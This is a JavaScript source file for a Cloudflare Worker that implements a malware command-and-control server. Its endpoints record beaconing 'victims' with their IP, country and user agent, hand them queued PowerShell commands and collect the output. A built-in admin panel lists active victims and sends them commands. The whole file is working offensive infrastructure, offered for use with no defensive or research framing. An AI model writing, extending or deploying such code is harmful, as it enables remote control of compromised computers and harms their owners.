// C2 Command & Control Worker
export default {
  async fetch(request, env) {
    const url = new URL(request.url);
    const corsHeaders = {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
      'Access-Control-Allow-Headers': '*',
    };
    
    if (request.method === 'OPTIONS') {
      return new Response(null, { headers: corsHeaders });
    }
    
    // Admin Panel
    if (url.pathname === '/admin') {
      return new Response(getAdminHTML(), {
        headers: { ...corsHeaders, 'Content-Type': 'text/html' }
      });
    }
    
    // Beacon endpoint
    if (url.pathname === '/beacon') {
      const victimID = request.headers.get('X-Victim-ID');
      
      if (victimID) {
        const timestamp = new Date().toISOString();
        const ip = request.headers.get('CF-Connecting-IP');
        const country = request.headers.get('CF-IPCountry') || 'Unknown';
        const userAgent = request.headers.get('User-Agent');
        
        await env.C2_STORAGE.put(`victim:${victimID}:last_seen`, timestamp);
        await env.C2_STORAGE.put(`victim:${victimID}:info`, JSON.stringify({
          ip, country, userAgent, firstSeen: timestamp
        }));
      }
      
      const cmd = await env.C2_STORAGE.get(`victim:${victimID}:command`);
      if (cmd) {
        await env.C2_STORAGE.delete(`victim:${victimID}:command`);
        return new Response(cmd, { headers: corsHeaders });
      }
      
      return new Response('idle', { headers: corsHeaders });
    }
    
    // Result endpoint
    if (url.pathname === '/result' && request.method === 'POST') {
      const victimID = request.headers.get('X-Victim-ID');
      const result = await request.text();
      const timestamp = new Date().toISOString();
      
      await env.C2_STORAGE.put(`victim:${victimID}:result`, JSON.stringify({
        result, timestamp
      }));
      
      return new Response('ok', { headers: corsHeaders });
    }
    
    // API: List victims
    if (url.pathname === '/api/victims') {
      const list = await env.C2_STORAGE.list({ prefix: 'victim:' });
      const victims = {};
      
      for (const key of list.keys) {
        const parts = key.name.split(':');
        const id = parts[1];
        const field = parts[2];
        
        if (!victims[id]) victims[id] = { id };
        
        const value = await env.C2_STORAGE.get(key.name);
        try {
          victims[id][field] = JSON.parse(value);
        } catch {
          victims[id][field] = value;
        }
      }
      
      return new Response(JSON.stringify(Object.values(victims)), {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' }
      });
    }
    
    // API: Send command
    if (url.pathname === '/api/command' && request.method === 'POST') {
      const { victimID, command } = await request.json();
      await env.C2_STORAGE.put(`victim:${victimID}:command`, command);
      return new Response('ok', { headers: corsHeaders });
    }
    
    // API: Get result
    if (url.pathname === '/api/result') {
      const victimID = url.searchParams.get('id');
      const data = await env.C2_STORAGE.get(`victim:${victimID}:result`);
      
      if (data) {
        const parsed = JSON.parse(data);
        return new Response(JSON.stringify(parsed), {
          headers: { ...corsHeaders, 'Content-Type': 'application/json' }
        });
      }
      
      return new Response(JSON.stringify({ result: 'No result yet', timestamp: null }), {
        headers: { ...corsHeaders, 'Content-Type': 'application/json' }
      });
    }
    
    return new Response('Not Found', { status: 404 });
  }
};

function getAdminHTML() {
  return `<!DOCTYPE html>
<html>
<head>
    <title>C2 Control Panel</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: system-ui; 
            background: #0f0f0f; 
            color: #fff; 
            padding: 20px; 
        }
        h1 { margin-bottom: 20px; color: #4facfe; }
        .victim { 
            background: #1a1a1a; 
            padding: 20px; 
            margin: 15px 0; 
            border-radius: 10px; 
            border-left: 4px solid #4facfe;
        }
        .victim h3 { color: #4facfe; margin-bottom: 10px; }
        .info { color: #999; font-size: 14px; margin: 5px 0; }
        .command-box { 
            margin-top: 15px; 
            display: flex; 
            gap: 10px; 
        }
        input { 
            flex: 1; 
            padding: 10px; 
            background: #2a2a2a; 
            border: 1px solid #444; 
            color: #fff; 
            border-radius: 5px; 
        }
        button { 
            padding: 10px 20px; 
            background: #4facfe; 
            border: none; 
            color: white; 
            border-radius: 5px; 
            cursor: pointer; 
            font-weight: 600;
        }
        button:hover { background: #3a8dd9; }
        pre { 
            background: #000; 
            padding: 15px; 
            border-radius: 5px; 
            overflow-x: auto; 
            margin-top: 10px;
            color: #0f0;
            font-size: 13px;
        }
        .status { 
            padding: 10px; 
            background: #2a2a2a; 
            border-radius: 5px; 
            margin-bottom: 20px; 
        }
    </style>
</head>
<body>
    <h1>🎯 C2 Command & Control Panel</h1>
    <div class="status">
        <span id="victimCount">Loading...</span> | 
        <button onclick="loadVictims()">🔄 Refresh</button>
    </div>
    <div id="victims"></div>
    
    <script>
    let autoRefresh = true;
    
    async function loadVictims() {
        try {
            const res = await fetch('/api/victims');
            const victims = await res.json();
            
            document.getElementById('victimCount').textContent = 
                \`\${victims.length} active victim(s)\`;
            
            if (victims.length === 0) {
                document.getElementById('victims').innerHTML = 
                    '<p style="color: #666;">No victims connected yet...</p>';
                return;
            }
            
            const html = victims.map(v => {
                const lastSeen = new Date(v.last_seen);
                const timeDiff = Math.floor((Date.now() - lastSeen) / 1000);
                const status = timeDiff < 120 ? '🟢 Online' : '🔴 Offline';
                
                return \`
                    <div class="victim">
                        <h3>\${status} Victim: \${v.id}</h3>
                        <div class="info">Last seen: \${lastSeen.toLocaleString()} (\${timeDiff}s ago)</div>
                        <div class="info">IP: \${v.info?.ip || 'Unknown'} | Country: \${v.info?.country || 'Unknown'}</div>
                        <div class="info">User Agent: \${v.info?.userAgent || 'Unknown'}</div>
                        
                        <div class="command-box">
                            <input type="text" id="cmd_\${v.id}" placeholder="Enter PowerShell command..." 
                                   onkeypress="if(event.key==='Enter') sendCmd('\${v.id}')">
                            <button onclick="sendCmd('\${v.id}')">Execute</button>
                            <button onclick="getResult('\${v.id}')">Get Result</button>
                        </div>
                        
                        <pre id="result_\${v.id}">No result yet. Commands execute every 60 seconds.</pre>
                    </div>
                \`;
            }).join('');
            
            document.getElementById('victims').innerHTML = html;
        } catch (e) {
            console.error('Error loading victims:', e);
        }
    }
    
    async function sendCmd(id) {
        const input = document.getElementById('cmd_' + id);
        const cmd = input.value;
        
        if (!cmd) {
            alert('Please enter a command');
            return;
        }
        
        try {
            await fetch('/api/command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ victimID: id, command: cmd })
            });
            
            input.value = '';
            document.getElementById('result_' + id).textContent = 
                '⏳ Command sent! Result will appear in ~60 seconds...';
        } catch (e) {
            alert('Error sending command: ' + e.message);
        }
    }
    
    async function getResult(id) {
        try {
            const res = await fetch('/api/result?id=' + id);
            const data = await res.json();
            
            const resultEl = document.getElementById('result_' + id);
            if (data.result && data.result !== 'No result yet') {
                resultEl.textContent = 
                    \`[\${new Date(data.timestamp).toLocaleString()}]\\n\${data.result}\`;
            } else {
                resultEl.textContent = 'No result yet';
            }
        } catch (e) {
            console.error('Error getting result:', e);
        }
    }
    
    // Auto-refresh every 10 seconds
    loadVictims();
    setInterval(() => {
        if (autoRefresh) loadVictims();
    }, 10000);
    </script>
</body>
</html>`;
}
